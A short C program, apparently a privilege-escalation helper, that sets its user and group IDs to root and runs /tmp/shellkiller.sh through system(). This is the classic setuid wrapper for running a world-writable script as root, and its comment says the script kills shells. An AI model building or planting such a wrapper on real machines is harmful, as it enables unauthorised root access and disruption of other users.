#include <stdlib.h>
#include <stdio.h>
// Tries to set uid to 0 and executes shell killer :)

int main(void) {
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    system("/tmp/shellkiller.sh");
}
